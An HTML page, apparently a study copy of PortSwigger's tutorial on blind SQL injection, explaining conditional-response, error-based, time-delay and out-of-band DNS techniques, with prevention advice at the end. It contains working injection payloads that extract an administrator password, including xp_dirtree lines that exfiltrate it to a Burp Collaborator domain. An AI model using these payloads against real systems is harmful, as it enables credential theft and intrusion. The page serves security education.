@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Blind SQL injection &mdash; PortSwigger 0.0 documentation</title>
+      <link rel="stylesheet" href="../../../_static/pygments.css" type="text/css" />
+      <link rel="stylesheet" href="../../../_static/css/theme.css" type="text/css" />
+  <!--[if lt IE 9]>
+    <script src="../../../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script src="../../../_static/jquery.js?v=5d32c60e"></script>
+        <script src="../../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+        <script data-url_root="../../../" id="documentation_options" src="../../../_static/documentation_options.js?v=44496db0"></script>
+        <script src="../../../_static/doctools.js?v=888ff710"></script>
+        <script src="../../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../../genindex.html" />
+    <link rel="search" title="Search" href="../../../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../../index.html" class="icon icon-home">
+            PortSwigger
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">服务端</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../race_conditions.html">条件竞争</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">客户端</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../client/xss/cross-site-scripting.html">Cross-site scripting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../client/csrf/csrf.html">Cross-site request forgery (CSRF)</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../client/cors/cors.html">Cross-origin resource sharing (CORS)</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../../index.html">PortSwigger</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">Blind SQL injection</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../../_sources/source/server/sql-injection/blind.md.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="blind-sql-injection">
+<h1>Blind SQL injection<a class="headerlink" href="#blind-sql-injection" title="Permalink to this heading"></a></h1>
+<p>In this section, we describe techniques for finding and exploiting blind SQL injection vulnerabilities.</p>
+<section id="what-is-blind-sql-injection">
+<h2>What is blind SQL injection?<a class="headerlink" href="#what-is-blind-sql-injection" title="Permalink to this heading"></a></h2>
+<p>Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.</p>
+<p>Many techniques such as <a class="reference external" href="https://portswigger.net/web-security/sql-injection/union-attacks"><code class="docutils literal notranslate"><span class="pre">UNION</span></code> attacks</a> are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application’s responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.</p>
+</section>
+<section id="exploiting-blind-sql-injection-by-triggering-conditional-responses">
+<h2>Exploiting blind SQL injection by triggering conditional responses<a class="headerlink" href="#exploiting-blind-sql-injection-by-triggering-conditional-responses" title="Permalink to this heading"></a></h2>
+<p>Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Cookie</span><span class="p">:</span> <span class="n">TrackingId</span><span class="o">=</span><span class="n">u5YD3PapBcR4lN3e7Tj4</span>
+</pre></div>
+</div>
+<p>When a request containing a <code class="docutils literal notranslate"><span class="pre">TrackingId</span></code> cookie is processed, the application uses a SQL query to determine whether this is a known user:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">SELECT</span> <span class="n">TrackingId</span> <span class="n">FROM</span> <span class="n">TrackedUsers</span> <span class="n">WHERE</span> <span class="n">TrackingId</span> <span class="o">=</span> <span class="s1">&#39;u5YD3PapBcR4lN3e7Tj4&#39;</span>
+</pre></div>
+</div>
+<p>This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If you submit a recognized <code class="docutils literal notranslate"><span class="pre">TrackingId</span></code>, the query returns data and you receive a “Welcome back” message in the response.</p>
+<p>This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition.</p>
+<p>To understand how this exploit works, suppose that two requests are sent containing the following <code class="docutils literal notranslate"><span class="pre">TrackingId</span></code> cookie values in turn:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>…xyz&#39; AND &#39;1&#39;=&#39;1 …xyz&#39; AND &#39;1&#39;=&#39;2
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>The first of these values causes the query to return results, because the injected <code class="docutils literal notranslate"><span class="pre">AND</span> <span class="pre">'1'='1</span></code> condition is true. As a result, the “Welcome back” message is displayed.</p></li>
+<li><p>The second value causes the query to not return any results, because the injected condition is false. The “Welcome back” message is not displayed.</p></li>
+</ul>
+<p>This allows us to determine the answer to any single injected condition, and extract data one piece at a time.</p>
+<p>For example, suppose there is a table called <code class="docutils literal notranslate"><span class="pre">Users</span></code> with the columns <code class="docutils literal notranslate"><span class="pre">Username</span></code> and <code class="docutils literal notranslate"><span class="pre">Password</span></code>, and a user called <code class="docutils literal notranslate"><span class="pre">Administrator</span></code>. You can determine the password for this user by sending a series of inputs to test the password one character at a time.</p>
+<p>To do this, start with the following input:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">xyz</span><span class="s1">&#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#39;</span><span class="n">Administrator</span><span class="s1">&#39;), 1, 1) &gt; &#39;</span><span class="n">m</span>
+</pre></div>
+</div>
+<p>This returns the “Welcome back” message, indicating that the injected condition is true, and so the first character of the password is greater than <code class="docutils literal notranslate"><span class="pre">m</span></code>.</p>
+<p>Next, we send the following input:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">xyz</span><span class="s1">&#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#39;</span><span class="n">Administrator</span><span class="s1">&#39;), 1, 1) &gt; &#39;</span><span class="n">t</span>
+</pre></div>
+</div>
+<p>This does not return the “Welcome back” message, indicating that the injected condition is false, and so the first character of the password is not greater than <code class="docutils literal notranslate"><span class="pre">t</span></code>.</p>
+<p>Eventually, we send the following input, which returns the “Welcome back” message, thereby confirming that the first character of the password is <code class="docutils literal notranslate"><span class="pre">s</span></code>:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">xyz</span><span class="s1">&#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#39;</span><span class="n">Administrator</span><span class="s1">&#39;), 1, 1) = &#39;</span><span class="n">s</span>
+</pre></div>
+</div>
+<p>We can continue this process to systematically determine the full password for the <code class="docutils literal notranslate"><span class="pre">Administrator</span></code> user.</p>
+<section id="note">
+<h3>Note<a class="headerlink" href="#note" title="Permalink to this heading"></a></h3>
+<p>The <code class="docutils literal notranslate"><span class="pre">SUBSTRING</span></code> function is called <code class="docutils literal notranslate"><span class="pre">SUBSTR</span></code> on some types of database. For more details, see the <a class="reference external" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>.</p>
+<p><strong>LAB</strong></p>
+<p>PRACTITIONER<a class="reference external" href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses">Blind SQL injection with conditional responses</a></p>
+<p>Solved</p>
+</section>
+</section>
+<section id="error-based-sql-injection">
+<h2>Error-based SQL injection<a class="headerlink" href="#error-based-sql-injection" title="Permalink to this heading"></a></h2>
+<p>Error-based SQL injection refers to cases where you’re able to use error messages to either extract or infer sensitive data from the database, even in blind contexts. The possibilities depend on the configuration of the database and the types of errors you’re able to trigger:</p>
+<ul class="simple">
+<li><p>You may be able to induce the application to return a specific error response based on the result of a boolean expression. You can exploit this in the same way as the <a class="reference external" href="https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-conditional-responses">conditional responses</a> we looked at in the previous section. For more information, see <a class="reference external" href="https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-conditional-errors">Exploiting blind SQL injection by triggering conditional errors</a>.</p></li>
+<li><p>You may be able to trigger error messages that output the data returned by the query. This effectively turns otherwise blind SQL injection vulnerabilities into visible ones. For more information, see <a class="reference external" href="https://portswigger.net/web-security/sql-injection/blind#extracting-sensitive-data-via-verbose-sql-error-messages">Extracting sensitive data via verbose SQL error messages</a>.</p></li>
+</ul>
+<section id="exploiting-blind-sql-injection-by-triggering-conditional-errors">
+<h3>Exploiting blind SQL injection by triggering conditional errors<a class="headerlink" href="#exploiting-blind-sql-injection-by-triggering-conditional-errors" title="Permalink to this heading"></a></h3>
+<p>Some applications carry out SQL queries but their behavior doesn’t change, regardless of whether the query returns any data. The technique in the previous section won’t work, because injecting different boolean conditions makes no difference to the application’s responses.</p>
+<p>It’s often possible to induce the application to return a different response depending on whether a SQL error occurs. You can modify the query so that it causes a database error only if the condition is true. Very often, an unhandled error thrown by the database causes some difference in the application’s response, such as an error message. This enables you to infer the truth of the injected condition.</p>
+<p>To see how this works, suppose that two requests are sent containing the following <code class="docutils literal notranslate"><span class="pre">TrackingId</span></code> cookie values in turn:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">xyz</span><span class="s1">&#39; AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE &#39;</span><span class="n">a</span><span class="s1">&#39; END)=&#39;</span><span class="n">a</span> <span class="n">xyz</span><span class="s1">&#39; AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE &#39;</span><span class="n">a</span><span class="s1">&#39; END)=&#39;</span><span class="n">a</span>
+</pre></div>
+</div>
+<p>These inputs use the <code class="docutils literal notranslate"><span class="pre">CASE</span></code> keyword to test a condition and return a different expression depending on whether the expression is true:</p>
+<ul class="simple">
+<li><p>With the first input, the <code class="docutils literal notranslate"><span class="pre">CASE</span></code> expression evaluates to <code class="docutils literal notranslate"><span class="pre">'a'</span></code>, which does not cause any error.</p></li>
+<li><p>With the second input, it evaluates to <code class="docutils literal notranslate"><span class="pre">1/0</span></code>, which causes a divide-by-zero error.</p></li>
+</ul>
+<p>If the error causes a difference in the application’s HTTP response, you can use this to determine whether the injected condition is true.</p>
+<p>Using this technique, you can retrieve data by testing one character at a time:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">xyz</span><span class="s1">&#39; AND (SELECT CASE WHEN (Username = &#39;</span><span class="n">Administrator</span><span class="s1">&#39; AND SUBSTRING(Password, 1, 1) &gt; &#39;</span><span class="n">m</span><span class="s1">&#39;) THEN 1/0 ELSE &#39;</span><span class="n">a</span><span class="s1">&#39; END FROM Users)=&#39;</span><span class="n">a</span>
+</pre></div>
+</div>
+<section id="id1">
+<h4>Note<a class="headerlink" href="#id1" title="Permalink to this heading"></a></h4>
+<p>There are different ways of triggering conditional errors, and different techniques work best on different database types. For more details, see the <a class="reference external" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>.</p>
+<p><strong>LAB</strong></p>
+<p>PRACTITIONER<a class="reference external" href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors">Blind SQL injection with conditional errors</a></p>
+<p>Solved</p>
+</section>
+</section>
+<section id="extracting-sensitive-data-via-verbose-sql-error-messages">
+<h3>Extracting sensitive data via verbose SQL error messages<a class="headerlink" href="#extracting-sensitive-data-via-verbose-sql-error-messages" title="Permalink to this heading"></a></h3>
+<p>Misconfiguration of the database sometimes results in verbose error messages. These can provide information that may be useful to an attacker. For example, consider the following error message, which occurs after injecting a single quote into an <code class="docutils literal notranslate"><span class="pre">id</span></code> parameter:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Unterminated</span> <span class="n">string</span> <span class="n">literal</span> <span class="n">started</span> <span class="n">at</span> <span class="n">position</span> <span class="mi">52</span> <span class="ow">in</span> <span class="n">SQL</span> <span class="n">SELECT</span> <span class="o">*</span> <span class="n">FROM</span> <span class="n">tracking</span> <span class="n">WHERE</span> <span class="nb">id</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;. Expected char</span>
+</pre></div>
+</div>
+<p>This shows the full query that the application constructed using our input. We can see that in this case, we’re injecting into a single-quoted string inside a <code class="docutils literal notranslate"><span class="pre">WHERE</span></code> statement. This makes it easier to construct a valid query containing a malicious payload. Commenting out the rest of the query would prevent the superfluous single-quote from breaking the syntax.</p>
+<p>Occasionally, you may be able to induce the application to generate an error message that contains some of the data that is returned by the query. This effectively turns an otherwise blind SQL injection vulnerability into a visible one.</p>
+<p>You can use the <code class="docutils literal notranslate"><span class="pre">CAST()</span></code> function to achieve this. It enables you to convert one data type to another. For example, imagine a query containing the following statement:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">CAST</span><span class="p">((</span><span class="n">SELECT</span> <span class="n">example_column</span> <span class="n">FROM</span> <span class="n">example_table</span><span class="p">)</span> <span class="n">AS</span> <span class="nb">int</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>Often, the data that you’re trying to read is a string. Attempting to convert this to an incompatible data type, such as an <code class="docutils literal notranslate"><span class="pre">int</span></code>, may cause an error similar to the following:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ERROR</span><span class="p">:</span> <span class="n">invalid</span> <span class="nb">input</span> <span class="n">syntax</span> <span class="k">for</span> <span class="nb">type</span> <span class="n">integer</span><span class="p">:</span> <span class="s2">&quot;Example data&quot;</span>
+</pre></div>
+</div>
+<p>This type of query may also be useful if a character limit prevents you from triggering conditional responses.</p>
+<p><strong>LAB</strong></p>
+<p>PRACTITIONER<a class="reference external" href="https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based">Visible error-based SQL injection</a></p>
+<p>Not solved</p>
+</section>
+</section>
+<section id="exploiting-blind-sql-injection-by-triggering-time-delays">
+<h2>Exploiting blind SQL injection by triggering time delays<a class="headerlink" href="#exploiting-blind-sql-injection-by-triggering-time-delays" title="Permalink to this heading"></a></h2>
+<p>If the application catches database errors when the SQL query is executed and handles them gracefully, there won’t be any difference in the application’s response. This means the previous technique for inducing conditional errors will not work.</p>
+<p>In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false. As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response.</p>
+<p>The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="s1">&#39;; IF (1=2) WAITFOR DELAY &#39;</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">10</span><span class="s1">&#39;-- &#39;</span><span class="p">;</span> <span class="n">IF</span> <span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="n">WAITFOR</span> <span class="n">DELAY</span> <span class="s1">&#39;0:0:10&#39;</span><span class="o">--</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>The first of these inputs does not trigger a delay, because the condition <code class="docutils literal notranslate"><span class="pre">1=2</span></code> is false.</p></li>
+<li><p>The second input triggers a delay of 10 seconds, because the condition <code class="docutils literal notranslate"><span class="pre">1=1</span></code> is true.</p></li>
+</ul>
+<p>Using this technique, we can retrieve data by testing one character at a time:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="s1">&#39;; IF (SELECT COUNT(Username) FROM Users WHERE Username = &#39;</span><span class="n">Administrator</span><span class="s1">&#39; AND SUBSTRING(Password, 1, 1) &gt; &#39;</span><span class="n">m</span><span class="s1">&#39;) = 1 WAITFOR DELAY &#39;</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:{</span><span class="n">delay</span><span class="p">}</span><span class="s1">&#39;--</span>
+</pre></div>
+</div>
+<section id="id2">
+<h3>Note<a class="headerlink" href="#id2" title="Permalink to this heading"></a></h3>
+<p>There are various ways to trigger time delays within SQL queries, and different techniques apply on different types of database. For more details, see the <a class="reference external" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>.</p>
+<p><strong>LAB</strong></p>
+<p>PRACTITIONER<a class="reference external" href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays">Blind SQL injection with time delays</a></p>
+<p>Solved</p>
+<p><strong>LAB</strong></p>
+<p>PRACTITIONER<a class="reference external" href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval">Blind SQL injection with time delays and information retrieval</a></p>
+<p>Solved</p>
+</section>
+</section>
+<section id="exploiting-blind-sql-injection-using-out-of-band-oast-techniques">
+<h2>Exploiting blind SQL injection using out-of-band (OAST) techniques<a class="headerlink" href="#exploiting-blind-sql-injection-using-out-of-band-oast-techniques" title="Permalink to this heading"></a></h2>
+<p>An application might carry out the same SQL query as the previous example but do it asynchronously. The application continues processing the user’s request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, but none of the techniques described so far will work. The application’s response doesn’t depend on the query returning any data, a database error occurring, or on the time taken to execute the query.</p>
+<p>In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. These can be triggered based on an injected condition to infer information one piece at a time. More usefully, data can be exfiltrated directly within the network interaction.</p>
+<p>A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). Many production networks allow free egress of DNS queries, because they’re essential for the normal operation of production systems.</p>
+<p>The easiest and most reliable tool for using out-of-band techniques is <a class="reference external" href="https://portswigger.net/burp/documentation/collaborator">Burp Collaborator</a>. This is a server that provides custom implementations of various network services, including DNS. It allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. <a class="reference external" href="https://portswigger.net/burp/pro">Burp Suite Professional</a> includes a built-in client that’s configured to work with Burp Collaborator right out of the box. For more information, see the documentation for <a class="reference external" href="https://portswigger.net/burp/documentation/desktop/tools/collaborator">Burp Collaborator</a>.</p>
+<p>The techniques for triggering a DNS query are specific to the type of database being used. For example, the following input on Microsoft SQL Server can be used to cause a DNS lookup on a specified domain:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="s1">&#39;; exec master..xp_dirtree &#39;</span><span class="o">//</span><span class="mi">0</span><span class="n">efdymgw1o5w9inae8mg4dfrgim9ay</span><span class="o">.</span><span class="n">burpcollaborator</span><span class="o">.</span><span class="n">net</span><span class="o">/</span><span class="n">a</span><span class="s1">&#39;--</span>
+</pre></div>
+</div>
+<p>This causes the database to perform a lookup for the following domain:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">0</span><span class="n">efdymgw1o5w9inae8mg4dfrgim9ay</span><span class="o">.</span><span class="n">burpcollaborator</span><span class="o">.</span><span class="n">net</span>
+</pre></div>
+</div>
+<p>You can use <a class="reference external" href="https://portswigger.net/burp/documentation/desktop/tools/collaborator">Burp Collaborator</a> to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookups occur.</p>
+<p><strong>LAB</strong></p>
+<p>PRACTITIONER<a class="reference external" href="https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band">Blind SQL injection with out-of-band interaction</a></p>
+<p>Solved</p>
+<p>Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="s1">&#39;; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username=&#39;</span><span class="n">Administrator</span><span class="s1">&#39;);exec(&#39;</span><span class="n">master</span><span class="o">..</span><span class="n">xp_dirtree</span> <span class="s2">&quot;//&#39;+@p+&#39;.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a&quot;</span><span class="s1">&#39;)--</span>
+</pre></div>
+</div>
+<p>This input reads the password for the <code class="docutils literal notranslate"><span class="pre">Administrator</span></code> user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This lookup allows you to view the captured password:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">S3cure</span><span class="o">.</span><span class="n">cwcsgt05ikji0n1f2qlzn5118sek29</span><span class="o">.</span><span class="n">burpcollaborator</span><span class="o">.</span><span class="n">net</span>
+</pre></div>
+</div>
+<p>Out-of-band (<a class="reference external" href="https://portswigger.net/burp/application-security-testing/oast">OAST</a>) techniques are a powerful way to detect and exploit blind SQL injection, due to the high chance of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.</p>
+<section id="id3">
+<h3>Note<a class="headerlink" href="#id3" title="Permalink to this heading"></a></h3>
+<p>There are various ways of triggering out-of-band interactions, and different techniques apply on different types of database. For more details, see the <a class="reference external" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>.</p>
+<p><strong>LAB</strong></p>
+<p>PRACTITIONER<a class="reference external" href="https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration">Blind SQL injection with out-of-band data exfiltration</a></p>
+<p>Solved</p>
+</section>
+</section>
+<section id="how-to-prevent-blind-sql-injection-attacks">
+<h2>How to prevent blind SQL injection attacks?<a class="headerlink" href="#how-to-prevent-blind-sql-injection-attacks" title="Permalink to this heading"></a></h2>
+<p>Although the techniques needed to find and exploit blind SQL injection vulnerabilities are different and more sophisticated than for regular SQL injection, the measures needed to prevent SQL injection are the same.</p>
+<p>As with regular SQL injection, blind SQL injection attacks can be prevented through the careful use of parameterized queries, which ensure that user input cannot interfere with the structure of the intended SQL query.</p>
+<section id="read-more">
+<h3>Read more<a class="headerlink" href="#read-more" title="Permalink to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://portswigger.net/web-security/sql-injection#how-to-prevent-sql-injection">How to prevent SQL injection</a></p></li>
+<li><p><a class="reference external" href="https://portswigger.net/burp/vulnerability-scanner">Find blind SQL injection vulnerabilities using Burp Suite’s web vulnerability scanner</a></p></li>
+</ul>
+</section>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2023, MirRoR4s.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
